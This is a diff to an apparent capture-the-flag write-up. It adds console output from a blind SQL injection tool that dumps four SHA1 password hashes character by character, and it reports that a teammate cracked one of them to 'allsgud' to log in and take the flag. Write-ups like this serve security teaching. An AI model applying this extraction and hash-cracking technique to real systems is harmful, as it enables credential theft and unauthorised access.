@@ -164,6 +164,187 @@
 [+] Found Char:-:A
 [+] Column user dumped::humanA
 ```
+- Password-hash-:
+
+```bash
+[+] Number of tables-:2
+[+] Number of Data's strings-:4
+[+]Dumping String:table:database:column:pass
+[+]Finding String Length
+[+] String-Length:-:40
+[+] Found Char:-:6
+[+] Found Char:-:b
+[+] Found Char:-:5
+[+] Found Char:-:f
+[+] Found Char:-:8
+[+] Found Char:-:e
+[+] Found Char:-:7
+[+] Found Char:-:4
+[+] Found Char:-:5
+[+] Found Char:-:3
+[+] Found Char:-:7
+[+] Found Char:-:8
+[+] Found Char:-:e
+[+] Found Char:-:0
+[+] Found Char:-:f
+[+] Found Char:-:c
+[+] Found Char:-:6
+[+] Found Char:-:4
+[+] Found Char:-:c
+[+] Found Char:-:e
+[+] Found Char:-:2
+[+] Found Char:-:0
+[+] Found Char:-:d
+[+] Found Char:-:c
+[+] Found Char:-:0
+[+] Found Char:-:4
+[+] Found Char:-:1
+[+] Found Char:-:9
+[+] Found Char:-:7
+[+] Found Char:-:4
+[+] Found Char:-:b
+[+] Found Char:-:0
+[+] Found Char:-:5
+[+] Found Char:-:b
+[+] Found Char:-:f
+[+] Found Char:-:5
+[+] Found Char:-:c
+[+] Found Char:-:1
+[+] Found Char:-:c
+[+] Found Char:-:c
+[+] Column pass dumped::6b5f8e745378e0fc64ce20dc041974b05bf5c1cc
+[+]Finding String Length
+[+] String-Length:-:40
+[+] Found Char:-:9
+[+] Found Char:-:a
+[+] Found Char:-:2
+[+] Found Char:-:3
+[+] Found Char:-:b
+[+] Found Char:-:6
+[+] Found Char:-:d
+[+] Found Char:-:4
+[+] Found Char:-:9
+[+] Found Char:-:a
+[+] Found Char:-:a
+[+] Found Char:-:2
+[+] Found Char:-:4
+[+] Found Char:-:4
+[+] Found Char:-:b
+[+] Found Char:-:7
+[+] Found Char:-:b
+[+] Found Char:-:0
+[+] Found Char:-:d
+[+] Found Char:-:b
+[+] Found Char:-:5
+[+] Found Char:-:2
+[+] Found Char:-:9
+[+] Found Char:-:4
+[+] Found Char:-:9
+[+] Found Char:-:c
+[+] Found Char:-:0
+[+] Found Char:-:9
+[+] Found Char:-:3
+[+] Found Char:-:2
+[+] Found Char:-:c
+[+] Found Char:-:3
+[+] Found Char:-:6
+[+] Found Char:-:5
+[+] Found Char:-:e
+[+] Found Char:-:c
+[+] Found Char:-:8
+[+] Found Char:-:1
+[+] Found Char:-:9
+[+] Found Char:-:1
+[+] Column pass dumped::9a23b6d49aa244b7b0db52949c0932c365ec8191
+[+]Finding String Length
+[+] String-Length:-:40
+[+] Found Char:-:6
+[+] Found Char:-:4
+[+] Found Char:-:b
+[+] Found Char:-:7
+[+] Found Char:-:c
+[+] Found Char:-:9
+[+] Found Char:-:0
+[+] Found Char:-:a
+[+] Found Char:-:9
+[+] Found Char:-:9
+[+] Found Char:-:1
+[+] Found Char:-:5
+[+] Found Char:-:7
+[+] Found Char:-:1
+[+] Found Char:-:c
+[+] Found Char:-:1
+[+] Found Char:-:0
+[+] Found Char:-:7
+[+] Found Char:-:c
+[+] Found Char:-:c
+[+] Found Char:-:6
+[+] Found Char:-:6
+[+] Found Char:-:3
+[+] Found Char:-:a
+[+] Found Char:-:a
+[+] Found Char:-:7
+[+] Found Char:-:6
+[+] Found Char:-:8
+[+] Found Char:-:5
+[+] Found Char:-:1
+[+] Found Char:-:4
+[+] Found Char:-:8
+[+] Found Char:-:2
+[+] Found Char:-:2
+[+] Found Char:-:8
+[+] Found Char:-:9
+[+] Found Char:-:6
+[+] Found Char:-:f
+[+] Found Char:-:4
+[+] Found Char:-:9
+[+] Column pass dumped::64b7c90a991571c107cc663aa768514822896f49
+[+]Finding String Length
+[+] String-Length:-:40
+[+] Found Char:-:9
+[+] Found Char:-:a
+[+] Found Char:-:a
+[+] Found Char:-:8
+[+] Found Char:-:8
+[+] Found Char:-:8
+[+] Found Char:-:e
+[+] Found Char:-:9
+[+] Found Char:-:a
+[+] Found Char:-:d
+[+] Found Char:-:7
+[+] Found Char:-:f
+[+] Found Char:-:2
+[+] Found Char:-:1
+[+] Found Char:-:9
+[+] Found Char:-:a
+[+] Found Char:-:1
+[+] Found Char:-:3
+[+] Found Char:-:3
+[+] Found Char:-:4
+[+] Found Char:-:8
+[+] Found Char:-:3
+[+] Found Char:-:6
+[+] Found Char:-:2
+[+] Found Char:-:b
+[+] Found Char:-:4
+[+] Found Char:-:d
+[+] Found Char:-:f
+[+] Found Char:-:4
+[+] Found Char:-:e
+[+] Found Char:-:4
+[+] Found Char:-:1
+[+] Found Char:-:d
+[+] Found Char:-:a
+[+] Found Char:-:3
+[+] Found Char:-:3
+[+] Found Char:-:c
+[+] Found Char:-:b
+[+] Found Char:-:4
+[+] Found Char:-:8
+[+] Column pass dumped::9aa888e9ad7f219a13348362b4df4e41da33cb48
+```
+
+- Hash-: ```64b7c90a991571c107cc663aa768514822896f49```
 
 - My team mate cracked the hash which is sha1 for `allsgud` which allowed him to login and get the flag.
 
